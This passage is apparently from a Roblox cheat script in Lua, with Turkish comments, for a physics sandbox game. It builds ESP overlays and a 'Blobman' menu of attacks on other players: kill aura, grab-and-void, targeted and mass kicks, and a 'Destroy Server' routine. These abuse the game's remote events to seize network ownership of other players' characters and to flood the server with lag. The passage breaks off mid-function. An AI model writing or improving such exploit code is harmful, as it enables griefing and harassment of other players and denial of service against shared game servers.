function setupPCLDListener()
    table.insert(pcldConnections, RunService.RenderStepped:Connect(function(dt)
        if not ESPState.PCLD.Enabled then return end
        local alpha = 1 - math.exp(-12 * dt)
        for part, clone in pairs(pcldClones) do
            if part and part.Parent and clone and clone.Parent then
                clone.Position = clone.Position:Lerp(part.Position, alpha)
                local rot = clone.Rotation
                local targetRot = part.Rotation
                clone.Rotation = Vector3.new(
                    rot.X + (targetRot.X - rot.X) * alpha,
                    rot.Y + (targetRot.Y - rot.Y) * alpha,
                    rot.Z + (targetRot.Z - rot.Z) * alpha
                )
            else
                if clone then pcall(function() clone:Destroy() end) end
                pcldClones[part] = nil
            end
        end
    end))
    workspace.DescendantAdded:Connect(function(child)
        if ESPState.PCLD.Enabled and child:IsA("BasePart") and PCLD_NAMES[child.Name:lower()] then
            task.wait(0.1)
            if child.Parent and not ESPSelection[child] then
                addPCLDSelection(child)
            end
        end
    end)
    workspace.DescendantRemoving:Connect(function(child)
        if ESPSelection[child] then
            removePCLDSelection(child)
        end
    end)
end

RunService.RenderStepped:Connect(function(dt)
    RainbowHue = (RainbowHue + dt * 0.28) % 1
    if ESPState.PCLD.Enabled and ESPState.PCLD.Rainbow then
        updateAllPCLDColors()
    end
    if ESPState.Info.Enabled then
        updateInfoESPText()
    end
    if ESPState.AntiKick.Enabled then
        updateAntiKickESP()
    end
end)

Players.PlayerRemoving:Connect(function(plr)
    if infoConnections[plr] then
        infoConnections[plr]:Disconnect()
        infoConnections[plr] = nil
    end
    if akCache[plr] then
        for _, tool in ipairs(akCache[plr]) do
            removeAntiKickESP(tool)
        end
        akCache[plr] = nil
    end
    distCache[plr] = nil
    pingCache[plr] = nil
end)

setupPCLDListener()

table.insert(pcldConnections, RunService.RenderStepped:Connect(function(dt)
    if not ESPState.PCLD.Enabled then return end
    local alpha = 1 - math.exp(-12 * dt)
    for part, clone in pairs(pcldClones) do
        if part and part.Parent and clone and clone.Parent then
            clone.Position = clone.Position:Lerp(part.Position, alpha)
            local rot = clone.Rotation
            local targetRot = part.Rotation
            clone.Rotation = Vector3.new(
                rot.X + (targetRot.X - rot.X) * alpha,
                rot.Y + (targetRot.Y - rot.Y) * alpha,
                rot.Z + (targetRot.Z - rot.Z) * alpha
            )
        else
            if clone then pcall(function() clone:Destroy() end) end
            pcldClones[part] = nil
        end
    end
end))

ESP:AddToggle("PCLD ESP", {
    Text = "PCLD ESP",
    Default = false,
    Callback = function(val)
        ESPState.PCLD.Enabled = val
        if val then
            startScan()
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and PCLD_NAMES[obj.Name:lower()] then
                    addPCLDSelection(obj)
                end
            end
        else
            removeAllPCLD()
            if not anythingEnabled() then stopScan() end
        end
    end,
}):AddColorPicker("PCLD Color", {
    Default = ESPState.PCLD.Color,
    Title = "PCLD Color",
    Callback = function(val)
        ESPState.PCLD.Color = val
        if not ESPState.PCLD.Rainbow then
            updateAllPCLDColors()
        end
    end,
})

ESP:AddToggle("Info ESP", {
    Text = "Info ESP",
    Default = false,
    Callback = function(val)
        ESPState.Info.Enabled = val
        if val then
            startScan()
            for _, plr in ipairs(Players:GetPlayers()) do
                createInfoESP(plr)
                if not infoConnections[plr] then
                    infoConnections[plr] = plr.CharacterAdded:Connect(function()
                        task.wait(0.5)
                        createInfoESP(plr)
                    end)
                end
            end
            if not playerAddedConn then
                playerAddedConn = Players.PlayerAdded:Connect(function(plr)
                    if not infoConnections[plr] then
                        infoConnections[plr] = plr.CharacterAdded:Connect(function()
                            task.wait(0.5)
                            createInfoESP(plr)
                        end)
                    end
                end)
            end
        else
            removeAllInfoESP()
            if not anythingEnabled() then stopScan() end
        end
    end,
}):AddColorPicker("Info Text Color", {
    Default = ESPState.Info.Color,
    Title = "Info Text Color",
    Callback = function(val)
        ESPState.Info.Color = val
    end,
})

ESP:AddToggle("Anti-Kick Highlight", {
    Text = "Anti-Kick Tool Highlight",
    Default = false,
    Callback = function(val)
        ESPState.AntiKick.Enabled = val
        if val then
            startScan()
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer then
                    scanAntiKickForPlayer(plr)
                end
            end
            updateAntiKickESP()
        else
            removeAllAntiKickESP()
            if not anythingEnabled() then stopScan() end
        end
    end,
})

ESP:AddDivider()

ESP:AddToggle("PCLD Rainbow", {
    Text = "PCLD Rainbow",
    Default = false,
    Callback = function(val)
        ESPState.PCLD.Rainbow = val
        if not val then
            updateAllPCLDColors()
        end
    end,
})

ESP:AddToggle("Info Rainbow", {
    Text = "Info Rainbow Text",
    Default = false,
    Callback = function(val)
        ESPState.Info.Rainbow = val
    end,
})

ESP:AddDivider()

ESP:AddToggle("Show Distance", {
    Text = "Show Distance",
    Default = true,
    Callback = function(val)
        ESPState.Info.ShowDistance = val
        updateInfoESPText()
    end,
})

ESP:AddToggle("Show PCLD Status", {
    Text = "Show PCLD Status",
    Default = true,
    Callback = function(val)
        ESPState.Info.ShowPCLD = val
        updateInfoESPText()
    end,
})

ESP:AddToggle("Show Anti-Kick Status", {
    Text = "Show Anti-Kick Status",
    Default = true,
    Callback = function(val)
        ESPState.Info.ShowAntiKick = val
        updateInfoESPText()
    end,
})

ESP:AddDivider()

-- ============================================================================
--  BLOBMAN  (E-Axum'daki "Blobman" sekmesinin tamami -> KOZMOZ Server sekmesi)
--  E-Axum'da bunlar ServerTab (Orion UI) altindaydi; burada Obsidian UI'ya
--  cevrildi. Hedef = Attack sekmesindeki "Target Player" dropdown'i.
-- ============================================================================
do
    local Debris = game:GetService("Debris")
    local RunService = game:GetService("RunService")
    local LocalP = Services.LocalPlayer

    local BK = {
        KillAuraRunning = false,
        KillAuraRange = 40,
        KillAuraToy = "CreatureBlobman",
        HeightMode = "Spawn",
        LineLagEnabled = false,
        LineLagThread = nil,
        ExcludeFriends = false,
        LastBlob = nil
    }

    local function BK_Notify(Title, Text)
        pcall(function()
            Library:Notify({ Title = Title, Description = Text, Time = 4 })
        end)
    end

    local function BK_TargetName()
        if targetDropdown and targetDropdown.Value and targetDropdown.Value ~= "" then
            return tostring(targetDropdown.Value):match("%(@(.+)%)")
        end
        return nil
    end

    local function BK_Target()
        local tn = BK_TargetName()
        if not tn then return nil, nil, nil end
        local tp = Players:FindFirstChild(tn)
        if not tp then return nil, nil, nil end
        local tChar = tp.Character
        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
        return tp, tChar, tRoot
    end

    local function BK_FWD(parent, part, time)
        if not parent then return nil end
        return parent:FindFirstChild(part) or parent:WaitForChild(part, time or 5)
    end

    local function BK_sno(part)
        if not part then return end
        pcall(function()
            Services.SetNetOwner:FireServer(part, part.CFrame)
        end)
    end

    local function BK_unsno(part)
        if not part then return end
        pcall(function()
            Services.DestroyLine:FireServer(part)
        end)
    end

    local function BK_isNetOwner(part)
        if not part then return false end
        local ok, res = pcall(function()
            return isnetworkowner(part)
        end)
        return ok and res == true
    end

    local function BK_NetOwnerOnPart(part)
        local po = part and part:FindFirstChild("PartOwner")
        return po and po.Value == LocalP.Name
    end

    -- E-Axum: CheckNetworkOwnerOnPlayer(nil, Root) -> hedefin Head'i bizde mi
    local function BK_NetOwnerOnPlayer(Root)
        if not Root then return false end
        local Head = Root.Parent and Root.Parent:FindFirstChild("Head")
        return Head and BK_NetOwnerOnPart(Head)
    end

    local function BK_StopAllVelocity(model)
        local part = model and (model.PrimaryPart or model)
        if not part or not part:IsA("BasePart") then return end
        part.AssemblyLinearVelocity = Vector3.zero
        part.AssemblyAngularVelocity = Vector3.zero
    end

    local function BK_SpawnToy(ToyName, SpawnCF)
        if LocalP:FindFirstChild("CanSpawnToy") and not LocalP.CanSpawnToy.Value then
            local t0 = tick()
            while not LocalP.CanSpawnToy.Value and tick() - t0 < 6 do
                task.wait()
            end
        end
        local Container = getInv()
        local myRoot = getHRP()
        if not Container or not myRoot then return nil end
        SpawnCF = SpawnCF or (myRoot.CFrame * CFrame.new(0, 14, 20))
        local spawned = nil
        local conn
        conn = Container.ChildAdded:Connect(function(child)
            if child.Name == ToyName then
                spawned = child
            end
        end)
        task.spawn(function()
            pcall(function()
                Services.SpawnToy:InvokeServer(ToyName, SpawnCF, Vector3.zero)
            end)
        end)
        local t0 = tick()
        repeat task.wait() until spawned or (tick() - t0 > 2.5)
        if conn then pcall(function() conn:Disconnect() end) end
        return spawned
    end

    -- E-Axum FindBlob (166. satirdaki): blobmanin ustunde oturuyorsan doner
    local function BK_SitBlob()
        local hum = getHum()
        local cached = BK.LastBlob
        local valid = cached and cached.Parent and cached:FindFirstChild("VehicleSeat")
            and cached.VehicleSeat.Occupant == hum
        if valid then
            return cached
        end
        BK.LastBlob = hum and hum.SeatPart and hum.SeatPart:FindFirstAncestor("CreatureBlobman")
        return BK.LastBlob
    end

    -- E-Axum FindBlob (8085. satirdaki "guvenli" surum): kendi toy klasorune bakar
    local function BK_InvBlob()
        local folder = getInv()
        return folder and folder:FindFirstChild("CreatureBlobman")
    end

    -- ===================== Server-lag yardimcilari =====================
    local function BK_GetAllPlayers()
        local players = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalP then
                table.insert(players, p)
            end
        end
        return players
    end

    local function BK_spamOwnership(root)
        BK_sno(root)
    end

    local function BK_destroyLineOnPlayer(root)
        pcall(function()
            Services.CreateLine:FireServer(root, CFrame.new(0, 1e9, 0))
            task.wait()
            Services.DestroyLine:FireServer(root)
        end)
    end

    local function BK_startLineLag()
        if BK.LineLagEnabled then return end
        BK.LineLagEnabled = true
        BK.LineLagThread = task.spawn(function()
            while BK.LineLagEnabled and task.wait() do
                local target = Workspace:FindFirstChild("SpawnLocation") or getHRP()
                if target then
                    for _ = 1, 4 do
                        local rx = math.random(-1000000000, 1000000000)
                        local rz = math.random(-1000000000, 1000000000)
                        pcall(function()
                            Services.CreateLine:FireServer(target, CFrame.new(rx, 0, rz))
                        end)
                    end
                end
            end
        end)
    end

    local function BK_stopLineLag()
        BK.LineLagEnabled = false
        if BK.LineLagThread then
            task.cancel(BK.LineLagThread)
            BK.LineLagThread = nil
        end
    end

    -- ===================== Kill Aura ortagi =====================
    local function BK_spawnBlobmanIfNeeded()
        local invFolder = getInv()
        if not invFolder then return nil end
        local existing = invFolder:FindFirstChild(BK.KillAuraToy)
        if existing then return existing end
        local char = getChar()
        local head = char and char:FindFirstChild("Head")
        if head then
            BK_SpawnToy(BK.KillAuraToy, head.CFrame)
        end
        return invFolder:WaitForChild(BK.KillAuraToy, 5)
    end

    local function BK_sitOnBlobman(blobman)
        if not blobman then return end
        local seat = blobman:FindFirstChildWhichIsA("VehicleSeat", true)
        local hum = getHum()
        if seat and hum and not seat.Occupant then
            task.wait(0.1)
            pcall(function() seat:Sit(hum) end)
        end
    end

    local function BK_runKillAura(DoTeleport)
        local hpToggle = false
        while BK.KillAuraRunning do
            task.wait(0.01)
            local char = getChar()
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            local blobman = BK_spawnBlobmanIfNeeded()
            if not blobman then continue end

            BK_sitOnBlobman(blobman)

            local scriptFolder = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
            local detector = blobman:FindFirstChild("LeftDetector")
            local weld = detector and detector:FindFirstChild("LeftWeld")

            if scriptFolder and detector and weld then
                local CreatureGrab = scriptFolder:FindFirstChild("CreatureGrab")
                local CreatureRelease = scriptFolder:FindFirstChild("CreatureRelease")
                local CreatureDrop = scriptFolder:FindFirstChild("CreatureDrop")

                if CreatureGrab and CreatureRelease and CreatureDrop then
                    hpToggle = not hpToggle
                    for _, plrTarget in ipairs(Players:GetPlayers()) do
                        if not BK.KillAuraRunning then break end
                        if plrTarget ~= LocalP then
                            local targetChar = plrTarget.Character
                            local thrp = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                            local thum = targetChar and targetChar:FindFirstChildOfClass("Humanoid")
                            if thrp and thum and (hrp.Position - thrp.Position).Magnitude <= BK.KillAuraRange then
                                pcall(function()
                                    CreatureGrab:FireServer(detector, thrp, weld)
                                    CreatureRelease:FireServer(weld, thrp)
                                    CreatureDrop:FireServer(weld, thrp)
                                    thum.Health = hpToggle and 0 or 100
                                end)
                            end
                        end
                    end
                end
            end

            if DoTeleport then
                local localChar = getChar()
                local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
                if localHRP then
                    for _, plrTarget in ipairs(Players:GetPlayers()) do
                        if not BK.KillAuraRunning then break end
                        if plrTarget ~= LocalP then
                            local targetChar = plrTarget.Character
                            local thrp = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                            if thrp then
                                pcall(function()
                                    localHRP.CFrame = thrp.CFrame + Vector3.new(0, 5, 0)
                                end)
                                task.wait(0.30)
                            end
                        end
                    end
                end
            end
        end
    end

    -- ===================== Kick All =====================
    local function BK_KickAll()
        local allPlayers = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalP then
                if BK.ExcludeFriends then
                    local isFriend = false
                    pcall(function()
                        isFriend = LocalP:IsFriendsWith(p.UserId)
                    end)
                    if isFriend then continue end
                end
                table.insert(allPlayers, p)
            end
        end

        if #allPlayers == 0 then
            BK_Notify("Kick All", "Kicklenecek oyuncu yok.")
            return
        end

        BK_Notify("Kick All", "Calisiyor... (" .. #allPlayers .. " kisi)")
        BK_startLineLag()

        local rootPart = getHRP()
        if rootPart then
            local spawnPos = rootPart.CFrame * CFrame.new(0, 0, -5)
            pcall(function()
                Services.SpawnToy:InvokeServer("CreatureBlobman", spawnPos, Vector3.new(0, 127, 0))
            end)
        end
        task.wait(0.5)

        local currentBlob = BK_InvBlob()
        if not currentBlob then
            BK_stopLineLag()
            BK_Notify("Kick All", "Blobman olusturulamadi.")
            return
        end

        local vehicleSeat = currentBlob:FindFirstChild("VehicleSeat")
        local myChar = getChar()
        if vehicleSeat and myChar then
            pcall(function()
                vehicleSeat:Sit(myChar:FindFirstChildOfClass("Humanoid"))
            end)
        end
        task.wait(0.3)

        local myRoot = getHRP()
        if not myRoot then
            BK_stopLineLag()
            return
        end

        for _, targetPlayer in ipairs(allPlayers) do
            local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                pcall(function()
                    myRoot.CFrame = targetRoot.CFrame
                end)
                task.wait(0.02)
                for i = 1, 3 do
                    pcall(function()
                        currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                            currentBlob.LeftDetector, targetRoot, currentBlob.LeftDetector.LeftWeld)
                        currentBlob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(currentBlob.LeftDetector.LeftWeld)
                    end)
                    if i < 3 then task.wait(0.08) end
                end
            end
        end

        pcall(function()
            myRoot.CFrame = CFrame.new(0, 100, 0)
        end)
        task.wait(0.1)

        for _, part in ipairs(currentBlob:GetDescendants()) do
            if part:IsA("BasePart") then
                pcall(function() part.Anchored = true end)
            end
        end
        task.wait(0.1)

        local radius = 10
        for i, targetPlayer in ipairs(allPlayers) do
            local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                local angle = math.rad((i - 1) * (360 / #allPlayers))
                local x = radius * math.cos(angle)
                local z = radius * math.sin(angle)
                pcall(function()
                    targetRoot.CFrame = CFrame.new(x, 110, z)
                end)
            end
        end
        task.wait(0.1)

        for _ = 1, 2 do
            for _, targetPlayer in ipairs(allPlayers) do
                local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    pcall(function()
                        Services.SetNetOwner:FireServer(targetRoot, CFrame.new(targetRoot.Position))
                        Services.DestroyLine:FireServer(targetRoot)
                    end)
                end
            end
            task.wait(0.1)
        end
        task.wait(0.3)

        for _, targetPlayer in ipairs(allPlayers) do
            local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                pcall(function()
                    currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                        currentBlob.LeftDetector, targetRoot, currentBlob.LeftDetector.LeftWeld)
                    currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                        currentBlob.RightDetector, targetRoot, currentBlob.RightDetector.RightWeld)
                end)
            end
        end

        for _, part in ipairs(currentBlob:GetDescendants()) do
            if part:IsA("BasePart") then
                pcall(function() part.Anchored = false end)
            end
        end

        BK_Notify("Kick All", "Bitti.")
    end

    -- ===================== Grab yardimcilari (E-Axum BringRight/DropRight) =====================
    local function BK_GrabHand(blob, root, side)
        if not blob or not root then return end
        local scriptFolder = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
        local detector = blob:FindFirstChild(side .. "Detector")
        local weld = detector and detector:FindFirstChild(side .. "Weld")
        if not scriptFolder or not detector or not weld then return end
        pcall(function()
            scriptFolder.CreatureGrab:FireServer(detector, root, weld)
        end)
    end

    local function BK_ReleaseHand(blob, root, side)
        if not blob or not root then return end
        local scriptFolder = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
        local detector = blob:FindFirstChild(side .. "Detector")
        local weld = detector and detector:FindFirstChild(side .. "Weld")
        if not scriptFolder or not detector or not weld then return end
        pcall(function()
            scriptFolder.CreatureRelease:FireServer(weld, root)
        end)
    end

    -- ===================== UI: Blobman =====================
    BlobmanGroup = Tabs.BlobmanTab:AddLeftGroupbox("Blobman", "bot")
    BlobmanGroup:AddLabel('<font color="rgb(0, 255, 120)">[TARGET]</font> Once Attack sekmesinden hedefi sec, sonra kullan.', true)

    BlobmanGroup:AddButton({
        Text = "Blobman Grab (Left)",
        Func = function()
            local target, _, tRoot = BK_Target()
            if not target then
                BK_Notify("Error", "Oyuncu secilmedi!")
                return
            end
            if not tRoot then
                BK_Notify("Error", "Hedef bulunamadi!")
                return
            end
            local myRoot = getHRP()
            if not myRoot then return end

            BK_Notify("Left Grab", "Bekle...")
            BK_GrabHand(BK_SitBlob(), tRoot, "Left")
            task.wait(0.6)
            pcall(function()
                myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 5, 0)
            end)
            task.wait(0.5)
            BK_GrabHand(BK_SitBlob(), tRoot, "Left")
            task.wait(0.7)
            BK_Notify("Success", target.Name .. " sol elle yakalandi")
        end
    })

    BlobmanGroup:AddButton({
        Text = "Blobman Grab (Right)",
        Func = function()
            local target, _, tRoot = BK_Target()
            if not target then
                BK_Notify("Error", "Oyuncu secilmedi!")
                return
            end
            if not tRoot then
                BK_Notify("Error", "Hedef bulunamadi!")
                return
            end
            local myRoot = getHRP()
            if not myRoot then return end

            BK_Notify("Right Grab", "Bekle...")
            BK_GrabHand(BK_SitBlob(), tRoot, "Right")
            task.wait(0.6)
            pcall(function()
                myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 5, 0)
            end)
            task.wait(0.5)
            BK_GrabHand(BK_SitBlob(), tRoot, "Right")
            task.wait(0.7)
            BK_Notify("Success", target.Name .. " sag elle yakalandi")
        end
    })

    BlobmanGroup:AddButton({
        Text = "Blobman Void Grab",
        Func = function()
            local target, _, tRoot = BK_Target()
            if not tRoot then
                BK_Notify("Error", "Hedef bulunamadi!")
                return
            end
            local myChar = getChar()
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myRoot then return end

            local originalCFrame = myRoot.CFrame
            BK_Notify("Void Grab", "Atiyorum")

            BK_GrabHand(BK_SitBlob(), tRoot, "Left")
            task.wait(0.45)
            pcall(function()
                myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 5, 0)
            end)
            task.wait(0.35)
            BK_GrabHand(BK_SitBlob(), tRoot, "Left")
            task.wait(0.25)
            BK_ReleaseHand(BK_SitBlob(), tRoot, "Left")
            task.wait(0.1)
            pcall(function()
                myRoot.CFrame = originalCFrame
            end)
            BK_Notify("Success", target.Name .. " bosluga atildi")
        end
    })

    BlobmanGroup:AddButton({
        Text = "Just Grab",
        Func = function()
            local target, _, tRoot = BK_Target()
            if not target then
                BK_Notify("Error", "Oyuncu secilmedi!")
                return
            end
            if not tRoot then
                BK_Notify("Error", "Hedefin karakteri bulunamadi!")
                return
            end
            local myRoot = getHRP()
            if not myRoot then return end

            BK_Notify("Just Grab", "Bekle...")
            local blob = BK_SitBlob()
            BK_GrabHand(blob, tRoot, "Right")
            task.wait(0.6)

            pcall(function()
                local b = blob or (getChar() and getChar():FindFirstChild("Blobman"))
                if b and b:FindFirstChild("Humanoid") then
                    b.Humanoid.Sit = true
                end
            end)
            task.wait(0.8)

            local originalCFrame = myRoot.CFrame
            pcall(function()
                myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 5, 0)
            end)
            task.wait(0.5)
            BK_GrabHand(BK_SitBlob(), tRoot, "Right")
            task.wait(0.7)
            pcall(function()
                myRoot.CFrame = originalCFrame
            end)
            BK_Notify("Success", target.Name .. " yakalandi ve geri donuldu")
        end
    })

    BlobmanGroup:AddButton({
        Text = "Bug in Hand",
        Func = function()
            local target, _, tRoot = BK_Target()
            if not target then
                BK_Notify("Error", "Oyuncu secilmedi!")
                return
            end
            if not tRoot then
                BK_Notify("Error", "Hedefin karakteri bulunamadi!")
                return
            end

            local blob = BK_InvBlob()
            if not blob then
                BK_Notify("Error", "Blobman bulunamadi!")
                return
            end

            local scriptFolder = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
            if not scriptFolder then return end
            local CreatureGrab = scriptFolder:FindFirstChild("CreatureGrab")
            local RightDetector = blob:FindFirstChild("RightDetector")
            local LeftDetector = blob:FindFirstChild("LeftDetector")
            local RightWeld = RightDetector and RightDetector:FindFirstChild("RightWeld")
            local LeftWeld = LeftDetector and LeftDetector:FindFirstChild("LeftWeld")

            if not (CreatureGrab and RightDetector and LeftDetector) then
                BK_Notify("Error", "Blobman'in parcalari bulunamadi!")
                return
            end

            BK_Notify("Bug in Hand", "Calisiyor...")
            local hum = getHum()

            for hand = 1, 2 do
                local detector = hand == 1 and RightDetector or LeftDetector
                local weld = hand == 1 and RightWeld or LeftWeld

                local decoy = BK_SpawnToy("YouDecoy")
                if decoy then
                    repeat
                        task.wait(0.06)
                        pcall(function()
                            CreatureGrab:FireServer(detector, decoy:WaitForChild("HumanoidRootPart", 2), weld)
                        end)
                    until (weld and weld.Attachment0) or not (hum and hum.SeatPart)
                    task.wait(0.1)
                    pcall(function() Services.DestroyToy:FireServer(decoy) end)
                end
                task.wait(0.15)
            end

            pcall(function()
                CreatureGrab:FireServer(RightDetector, tRoot, RightWeld)
                task.wait(0.08)
                CreatureGrab:FireServer(LeftDetector, tRoot, LeftWeld)
            end)
            task.wait(0.2)
            BK_Notify("Bug in Hand", "Hedef iki elde takildi: " .. target.Name)
        end
    })

    BlobmanGroup:AddDivider()

    BlobmanGroup:AddToggle("BlobmanKillAura", {
        Text = "Kill Aura",
        Default = false,
        Callback = function(Value)
            BK.KillAuraRunning = Value
            if Value then
                task.spawn(BK_runKillAura, false)
            end
        end
    })

    BlobmanGroup:AddToggle("BlobmanKillAuraTP", {
        Text = "Kill Aura (teleport)",
        Default = false,
        Callback = function(Value)
            BK.KillAuraRunning = Value
            if Value then
                task.spawn(BK_runKillAura, true)
            end
        end
    })

    BlobmanGroup:AddButton({
        Text = "🔴 STOP",
        Func = function()
            BK.KillAuraRunning = false
            pcall(function() Toggles["BlobmanKillAura"]:SetValue(false) end)
            pcall(function() Toggles["BlobmanKillAuraTP"]:SetValue(false) end)
        end
    })

    BlobmanGroup:AddButton({
        Text = "Target Kick [V1]",
        Func = function()
            local blob = BK_InvBlob()
            local myChar = getChar()
            local hum = getHum()
            if not (myChar and hum) then return end
            local oldCF = myChar:GetPivot()

            local _, _, RootPart = BK_Target()
            if not RootPart then return end

            if not blob then
                blob = BK_SpawnToy("CreatureBlobman")
                if not blob then return end
                local Seat = BK_FWD(blob, "VehicleSeat")
                if not Seat then return end
                Seat:Sit(hum)
                while Seat.Occupant ~= hum do task.wait() end
            end

            local RightDetector = blob:FindFirstChild("RightDetector")
            local RightWeld = RightDetector and RightDetector:FindFirstChild("RightWeld")
            local scriptFolder = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
            if not (RightDetector and RightWeld and scriptFolder) then return end
            local CreatureGrab = scriptFolder:FindFirstChild("CreatureGrab")
            local CreatureDrop = scriptFolder:FindFirstChild("CreatureDrop")
            local CreatureRelease = scriptFolder:FindFirstChild("CreatureRelease")
            if not (CreatureGrab and CreatureDrop and CreatureRelease) then return end

            repeat
                pcall(function()
                    myChar:PivotTo(RootPart.CFrame * CFrame.new(0, 10, 5) * CFrame.new(RootPart.AssemblyLinearVelocity * 0.4))
                end)
                CreatureGrab:FireServer(RightDetector, RootPart, RightWeld)
                task.wait(0.05)
            until RightWeld.Attachment0 or not hum.SeatPart

            if RightWeld.Attachment0 then
                CreatureRelease:FireServer(RightWeld, RootPart)
                if BK_isNetOwner(RootPart) then
                    for _, v in pairs(RootPart.Parent:GetChildren()) do
                        if v:IsA("BasePart") then
                            v.CFrame = oldCF * CFrame.new(0, 20, 0)
                        end
                    end
                end
                pcall(function()
                    myChar:PivotTo(oldCF)
                end)
                while not BK_NetOwnerOnPlayer(RootPart) and RunService.Stepped:Wait() and hum.SeatPart do
                    BK_sno(RootPart)
                end
                pcall(function()
                    RootPart.Parent:PivotTo(oldCF * CFrame.new(0, 20, 0))
                end)
                BK_StopAllVelocity(RootPart.Parent)
                repeat
                    CreatureGrab:FireServer(RightDetector, RootPart, RightWeld)
                    task.wait(0.05)
                until RightWeld.Attachment0 or not hum.SeatPart
                for _ = 1, 5 do
                    BK_unsno(RootPart)
                end
            end
        end
    })

    BlobmanGroup:AddButton({
        Text = "Spam Kick",
        Func = function()
            local blob = BK_InvBlob()
            local myChar = getChar()
            local hum = getHum()
            if not (myChar and hum) then return end
            local oldCF = myChar:GetPivot()

            local _, _, RootPart = BK_Target()
            if not RootPart then return end

            if not blob then
                blob = BK_SpawnToy("CreatureBlobman")
                if not blob then return end
                local Seat = blob:FindFirstChild("VehicleSeat")
                if Seat then
                    Seat:Sit(hum)
                    local start = tick()
                    while not Seat.Occupant and tick() - start < 3 do
                        task.wait()
                    end
                end
            end
            if not blob then return end

            local RightDetector = blob:FindFirstChild("RightDetector")
            local scriptFolder = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
            local CreatureGrab = scriptFolder and scriptFolder:FindFirstChild("CreatureGrab")
            if not RightDetector or not CreatureGrab then return end
            local RightWeld = RightDetector:FindFirstChild("RightWeld")

            local BodyPos = Instance.new("BodyPosition")
            BodyPos.Name = "BlobSnoKickBodyPos"
            BodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            BodyPos.Position = RootPart.Position + Vector3.new(0, 20, 0)
            BodyPos.P = 45000
            BodyPos.D = 500
            BodyPos.Parent = RootPart

            for _ = 1, 35 do
                if not hum or not hum.SeatPart or not RootPart then break end
                pcall(function()
                    blob:PivotTo(RootPart.CFrame * CFrame.new(0, 5, 5))
                end)
                BK_sno(RootPart)
                task.wait(0.05)
            end

            for _ = 1, 12 do
                BK_sno(RootPart)
                task.wait(0.01)
            end

            task.defer(BK_StopAllVelocity, blob)
            BK_unsno(RootPart)
            pcall(function()
                blob:PivotTo(RootPart.CFrame * CFrame.new(0, 3, 0))
            end)

            local grabbed = false
            for _ = 1, 25 do
                if RightWeld and RightWeld.Attachment0 then
                    grabbed = true
                    break
                end
                CreatureGrab:FireServer(RightDetector, RootPart, RightWeld)
                task.wait(0.03)
            end
            if not grabbed then
                task.wait(0.1)
                CreatureGrab:FireServer(RightDetector, RootPart, RightWeld)
            end

            pcall(function()
                blob:PivotTo(oldCF)
            end)
            Debris:AddItem(BodyPos, 1)
        end
    })

    -- ===================== UI: Server =====================
    BlobmanServerGroup = Tabs.BlobmanTab:AddRightGroupbox("Blobman Server Lag", "server")
    BlobmanServerGroup:AddLabel('<font color="rgb(255, 80, 80)">[DESTROY]</font> Destroy Server basilirsa network lag olur.', true)

    BlobmanServerGroup:AddDropdown("BlobmanHeightMode", {
        Text = "MODE",
        Values = { "Spawn", "Heaven" },
        Default = "Spawn",
        Callback = function(Value)
            if typeof(Value) == "table" then
                Value = Value[1]
            end
            BK.HeightMode = (Value == "Heaven") and "Heaven" or "Spawn"
        end
    })

    BlobmanServerGroup:AddButton({
        Text = "Destroy Server",
        Func = function()
            task.spawn(function()
                local height = (BK.HeightMode == "Heaven") and 1e9 or 35
                BK_startLineLag()
                task.wait(0.8)

                local players = BK_GetAllPlayers()
                if #players == 0 then
                    BK_stopLineLag()
                    BK_Notify("Destroy Server", "Baska oyuncu yok.")
                    return
                end

                local myHrp = getHRP()
                if not myHrp then
                    BK_stopLineLag()
                    return
                end

                local playerData = {}
                for _, p in ipairs(players) do
                    local char = p.Character
                    local targetHrp = char and char:FindFirstChild("HumanoidRootPart")
                    if targetHrp then
                        table.insert(playerData, { plr = p, hrp = targetHrp })
                    end
                end

                for _, data in ipairs(playerData) do
                    pcall(function()
                        myHrp.CFrame = data.hrp.CFrame * CFrame.new(0, 5, 5)
                    end)
                    task.wait(0.15)
                    BK_spamOwnership(data.hrp)
                end

                local radius = 45
                local angleStep = (math.pi * 2) / #playerData

                for idx, data in ipairs(playerData) do
                    local angle = (idx - 1) * angleStep
                    local x = math.cos(angle) * radius
                    local z = math.sin(angle) * radius
                    local targetPos = Vector3.new(x, height, z)

                    pcall(function()
                        local hrp = data.hrp
                        local hum = data.plr.Character:FindFirstChildOfClass("Humanoid")
                        if hum then
                            hum.PlatformStand = true
                            hum.AutoRotate = false
                        end
                        hrp.CFrame = CFrame.new(targetPos)
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                        BK_spamOwnership(hrp)
                        task.wait(0.05)
                        BK_spamOwnership(hrp)
                    end)

